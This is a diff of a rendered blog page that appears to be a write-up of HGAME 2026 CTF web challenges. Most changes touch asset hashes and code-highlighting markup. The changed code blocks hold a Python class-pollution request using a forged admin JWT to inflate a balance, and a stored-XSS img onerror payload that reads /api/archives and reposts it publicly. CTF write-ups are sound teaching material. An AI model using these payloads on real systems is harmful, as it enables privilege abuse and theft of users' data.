@@ -1,7 +1,7 @@
 <!doctype html>
 <html class="position-relative" itemscope itemtype="https://schema.org/WebPage" lang="en"
   data-bs-theme="auto" data-palette="blue">
-  <head><script src="/assets/init/bundle.min.658d13e58d95d8bb2da082cf6e92f29c1f07475fd145926c2c401f88f9ddf545.js" integrity="sha256-ZY0T5Y2V2LstoILPbpLynB8HR1/RRZJsLEAfiPnd9UU=" crossorigin="anonymous"></script>
+  <head><script src="/assets/init/bundle.min.0815b7e73ceecd1be5ee8303df916b89a7fd1454fb835a47e3b2f9739781426f.js" integrity="sha256-CBW35zzuzRvl7oMD35Friaf9FFT7g1pH47L5c5eBQm8=" crossorigin="anonymous"></script>
 <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>HGAME-web2026-WP - decimo的小窝</title>
@@ -34,7 +34,7 @@
   <meta itemprop="description" content="HGAME2026-web复现wp_部分题解">
   <meta itemprop="datePublished" content="2026-03-05T18:35:35+08:00">
   <meta itemprop="dateModified" content="2026-03-05T18:35:35+08:00">
-  <meta itemprop="wordCount" content="65">
+  <meta itemprop="wordCount" content="69">
   <meta itemprop="image" content="https://decimo.top/images/HGAME2026.png">
   <meta itemprop="keywords" content="CTF,Web">
   <meta property="og:image:alt" content="HGAME-web2026-WP" />
@@ -45,7 +45,7 @@
     <link data-precache rel="stylesheet" href="/assets/viewer/bundle.min.16d2c85c4cae39a98f8cb7a977e95e554b174f91a5484c32605637156f49ca6b.css" integrity="sha256-FtLIXEyuOamPjLepd&#43;leVUsXT5GlSEwyYFY3FW9Jyms=" crossorigin="anonymous">
 
 
-<link rel="stylesheet" href="/css/custom.8cc5830dfc3827d70305a39f1925ac813f85effc381d9b656ac82115d234cbea.css" integrity="sha256-jMWDDfw4J9cDBaOfGSWsgT&#43;F7/w4HZtlasghFdI0y&#43;o=" crossorigin="anonymous">
+<link rel="stylesheet" href="/css/custom.730a801596309655d4fc41e9ef9ac6d3a06d0396ba0b1cea47e7418cf1013673.css" integrity="sha256-cwqAFZYwllXU/EHp75rG06BtA5a6CxzqR&#43;dBjPEBNnM=" crossorigin="anonymous">
 <script>
 (function() {
   var originalTitle = document.title;
@@ -296,13 +296,13 @@ decimo的小窝
 <p>终于登录为了admin，然后还是买不了。通过改包或者抢米都改不了余额</p>
 <p>我们再看上图，<code>uid</code> 在 Header 里，使用POST /api/upadte，下面还有json大括号</p>
 <p>所以尝试python原型链污染，在抢米的时候抓包得知变量叫balance</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>xiaochai_123@binarios:~$ curl -X POST <span style="color:#e6db74">&#34;http://forward.vidar.club:30452//api/update&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzcyNzA4Nzg4fQ.BZjJ7f_603GwNzZFWxWCyY7R36PItLaB3wgqPHy3vKo&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;uid: 1413914&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#34;{\&#34;__init__\&#34;: {\&#34;__globals__\&#34;: {\&#34;balance\&#34;: 2000000}}}&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;is_admin&#34;</span>:true,<span style="color:#e6db74">&#34;msg&#34;</span>:<span style="color:#e6db74">&#34;System Access Granted&#34;</span>,<span style="color:#e6db74">&#34;user_info&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;balance&#34;</span>:2000000,<span style="color:#e6db74">&#34;role&#34;</span>:<span style="color:#e6db74">&#34;user&#34;</span>,<span style="color:#e6db74">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;admin&#34;</span><span style="color:#f92672">}}</span>
-</span></span><span style="display:flex;"><span>xiaochai_123@binarios:~$
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="ln">1</span><span class="cl">xiaochai_123@binarios:~$ curl -X POST <span class="s2">&#34;http://forward.vidar.club:30452//api/update&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="se"></span>  -H <span class="s2">&#34;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzcyNzA4Nzg4fQ.BZjJ7f_603GwNzZFWxWCyY7R36PItLaB3wgqPHy3vKo&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="se"></span>  -H <span class="s2">&#34;uid: 1413914&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="se"></span>  -H <span class="s2">&#34;Content-Type: application/json&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="se"></span>  -d <span class="s2">&#34;{\&#34;__init__\&#34;: {\&#34;__globals__\&#34;: {\&#34;balance\&#34;: 2000000}}}&#34;</span>
+</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="o">{</span><span class="s2">&#34;is_admin&#34;</span>:true,<span class="s2">&#34;msg&#34;</span>:<span class="s2">&#34;System Access Granted&#34;</span>,<span class="s2">&#34;user_info&#34;</span>:<span class="o">{</span><span class="s2">&#34;balance&#34;</span>:2000000,<span class="s2">&#34;role&#34;</span>:<span class="s2">&#34;user&#34;</span>,<span class="s2">&#34;username&#34;</span>:<span class="s2">&#34;admin&#34;</span><span class="o">}}</span>
+</span></span><span class="line"><span class="ln">7</span><span class="cl">xiaochai_123@binarios:~$
 </span></span></code></pre></div><p>现在我们就有钱直接买flag啦<picture><img class="img-fluid " alt="image-20260305185510259" src="https://decimo.top/images/screenshoots/2026-03/image-20260305185510259.png?v=e92a0031ca6ec847987fe1dcc30fc702" loading="lazy" width="1460" height="984" />
 </picture>
 
@@ -311,7 +311,7 @@ decimo的小窝
 <h1 id="博丽神社的绘马挂" data-numberify>博丽神社的绘马挂<a class="anchor ms-1" href="#博丽神社的绘马挂"></a></h1>
 <p>随便登录就登录上了？然后是发帖系统，考察XSS</p>
 <p>xss img标签外带出网，把灵梦的信息偷了</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;img</span> <span style="color:#960050;background-color:#1e0010">src=x</span> <span style="color:#960050;background-color:#1e0010">onerror=</span><span style="color:#e6db74">&#34;fetch(&#39;/api/archives&#39;).then(r=&gt;r.text()).then(t=&gt;{fetch(&#39;/api/messages&#39;,{method:&#39;POST&#39;,headers:{&#39;Content-Type&#39;:&#39;application/json&#39;},body:JSON.stringify({content:&#39;ARCHIVE:&#39;+btoa(unescape(encodeURIComponent(t))),is_private:false})})})&#34;</span><span style="color:#960050;background-color:#1e0010">&gt;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="ln">1</span><span class="cl"><span class="err">&lt;img</span> <span class="err">src=x</span> <span class="err">onerror=</span><span class="s2">&#34;fetch(&#39;/api/archives&#39;).then(r=&gt;r.text()).then(t=&gt;{fetch(&#39;/api/messages&#39;,{method:&#39;POST&#39;,headers:{&#39;Content-Type&#39;:&#39;application/json&#39;},body:JSON.stringify({content:&#39;ARCHIVE:&#39;+btoa(unescape(encodeURIComponent(t))),is_private:false})})})&#34;</span><span class="err">&gt;</span>
 </span></span></code></pre></div><p>出网弄不出来，直接让他把flag发出来看</p>
 <p><picture><img class="img-fluid " alt="msedge_slJq5rulWJ" src="https://decimo.top/images/screenshoots/2026-03/msedge_slJq5rulWJ.png?v=4d1e50919fdccf11090186e036774a1c" loading="lazy" width="1451" height="893" />
 </picture>
@@ -739,10 +739,8 @@ decimo的小窝
 </div>
   <div class="col-12 col-lg-8 offset-0 offset-lg-1"></div>
 </div>
-<script src="/js/copy-code.js"></script>
-<link rel="stylesheet" href="/css/copy-code.css">
 </footer>
-<script data-precache src="/assets/main/bundle.min.d462af947fff0bbdb09a7b9fcb40a12bc7ca3b7ee172a4a5a35044386026b13d.js" integrity="sha256-1GKvlH//C72wmnufy0ChK8fKO37hcqSlo1BEOGAmsT0=" crossorigin="anonymous" async></script><script data-precache src="/assets/icons/bundle.min.0b03280daa4a59445b0aafc46855a2bb53b310e572534596869c33acaeec09dd.js" integrity="sha256-CwMoDapKWURbCq/EaFWiu1OzEOVyU0WWhpwzrK7sCd0=" crossorigin="anonymous" defer></script>
+<script data-precache src="/assets/main/bundle.min.87619fbefacaa035367e3393cad6ce3508196b946cf9962924868666df3f298f.js" integrity="sha256-h2GfvvrKoDU2fjOTytbONQgZa5Rs&#43;ZYpJIaGZt8/KY8=" crossorigin="anonymous" async></script><script data-precache src="/assets/icons/bundle.min.0b03280daa4a59445b0aafc46855a2bb53b310e572534596869c33acaeec09dd.js" integrity="sha256-CwMoDapKWURbCq/EaFWiu1OzEOVyU0WWhpwzrK7sCd0=" crossorigin="anonymous" defer></script>
 <script data-precache src="/assets/viewer/bundle.min.cca398d318de9fa7816141db90f09282784fcfe0c5dabc31599b8c589932e4ae.js" integrity="sha256-zKOY0xjen6eBYUHbkPCSgnhPz&#43;DF2rwxWZuMWJky5K4=" crossorigin="anonymous" defer></script>
 <script src="https://giscus.app/client.js"
     data-repo="xiaochai-123/xiaochai-123.github.io"
